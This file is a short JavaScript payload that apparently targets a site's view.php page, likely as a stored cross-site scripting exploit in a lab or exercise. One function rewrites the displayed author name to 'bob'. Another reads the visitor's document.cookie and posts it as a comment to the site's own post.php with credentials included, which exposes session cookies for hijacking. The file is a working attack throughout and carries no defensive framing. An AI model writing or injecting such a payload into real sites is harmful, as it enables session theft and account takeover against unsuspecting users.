
function checkUrl(){
	    if (window.location.href.indexOf('view.php?id=')>-1){
		        	var val = document.getElementById('author').innerHTML;
		    		var arr = val.split(' ');
		    		var name = arr[2];
		    		val = val.replace(name,'bob');
		    		document.getElementById('author').innerHTML = val;
		        	return true;    	
		        }
	    return false;
}
checkUrl();

function getID(){
		var url=window.location.href;
		if (url.indexOf('view.php?id=')>-1){
					var val = window.location.href;
					var index =window.location.href.indexOf('id=')-(-3);
					var ID = (window.location.href.substring(index));
					return ID;
				}
}


function leakCookies(postID){
		var url=window.location.href;
		if(url.indexOf('view.php?id=')>-1){
					url=url.substring(0,url.indexOf('view'));
					url=url.concat('post.php');
					var str='comment=';
					str=str.concat(document.cookie);
					str=str.concat("&uid=7&submit=&form=comment&parent=");
					str=str.concat(postID);
					fetch(url,
									{headers:{'Content-type':'application/x-www-form-urlencoded; charset=UTF-8'},
													credentials:'include',
													method:'post',body:str})
				}
}

leakCookies(getID())
